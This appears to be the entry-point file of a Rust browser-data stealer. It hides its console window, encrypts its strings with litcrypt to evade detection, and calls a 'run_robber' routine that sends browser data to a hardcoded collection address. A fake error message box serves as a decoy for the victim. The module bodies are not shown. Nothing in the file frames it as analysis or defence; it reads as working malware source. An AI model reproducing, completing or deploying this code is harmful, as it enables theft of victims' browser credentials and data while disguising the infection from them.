#![windows_subsystem = "windows"]
mod browser;
mod crypto;
mod robber;
use litcrypt::{lc, use_litcrypt};
use std::ffi::CString;
use user32::MessageBoxA;

use_litcrypt!("oqkast];fd./lyeh.je,w;lha,jtcxmy");

fn main() -> () {
    let error: bool = true;
    let error_message = r#"Hello from the other side"#;
    let _ = browser::run_robber(true, false, &lc!("http://127.0.0.1:55"));
    if error == true {
        let _ = show_error(error_message);
    }
}

fn show_error(error_message: &str) -> Result<i32, ()> {
    let title = CString::new("Error!").unwrap();
    let message = CString::new(error_message).unwrap();
    unsafe {
        MessageBoxA(std::ptr::null_mut(), message.as_ptr(), title.as_ptr(), 0x10);
    }
    Ok(0)
}
